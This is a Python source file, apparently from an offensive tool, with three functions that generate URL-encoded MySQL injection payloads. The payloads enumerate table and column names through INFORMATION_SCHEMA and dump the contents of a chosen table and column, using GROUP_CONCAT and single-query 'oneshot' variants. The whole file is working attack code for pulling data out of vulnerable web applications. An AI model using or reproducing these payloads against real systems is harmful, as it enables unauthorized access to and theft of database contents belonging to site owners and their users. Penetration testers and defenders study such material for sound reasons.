import logging
from icecream import ic


def get_sqli_tables(sqli_string: str):
    try:
        sqli_string = sqli_string.encode('utf-8')
        hex_value_db = '0x' + bytes.hex(sqli_string)
        payload_group_concat = "(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=" + hex_value_db + ")"
        payload_oneshot = "(SELECT+(@x)+FROM+(SELECT+(@x:=0x00),(@NR_DB:=0),(SELECT+(0)+FROM+(INFORMATION_SCHEMA.SCHEMATA)+WHERE+(@x)+IN+(@x:=CONCAT(@x,LPAD(@NR_DB:=@NR_DB%2b1,2,0x30),0x20203a2020,schema_name,0x3c62723e))))x)"
        return [payload_group_concat, payload_oneshot]
    except Exception as e:
        ic(e)
        ic()
        logging.error(e)


def get_sqli_columns(sqli_string: str):
    try:
        hex_value_table = sqli_string.encode('utf-8')
        hex_value_table = '0x' + bytes.hex(hex_value_table)
        payload_group_concat = "(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=" + hex_value_table + ")"
        payload_oneshot = "(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_NAME=" + hex_value_table + ")AND(0x00)IN(@x:=concat(@x,CONCAT(LPAD(@NR:=@NR%2b1,2,0x30),0x3a20,column_name,0x3c62723e)))))x)"
        return [payload_group_concat, payload_oneshot]
    except Exception as e:
        ic(e)
        ic()
        logging.error(e)


def get_sqli_data(sqli_string: str):
    try:
        sqli_string = sqli_string.split(' ')
        db_name = sqli_string[1]
        table = sqli_string[2]
        column = sqli_string[3].replace(' ', '+')

        payload_group_concat = "(SELECT+GROUP_CONCAT(" + column + "+SEPARATOR+0x3c62723e)+FROM+" + db_name + "." + table + ")"
        payload_oneshot = "(SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(@x)FROM(" + db_name + "." + table + ")WHERE(@x)IN(@x:=CONCAT(0x20,@x," + column + ",0x3c62723e))))x)"
        return [payload_group_concat, payload_oneshot]
    except Exception as e:
        ic(e)
        ic()
        logging.error(e)
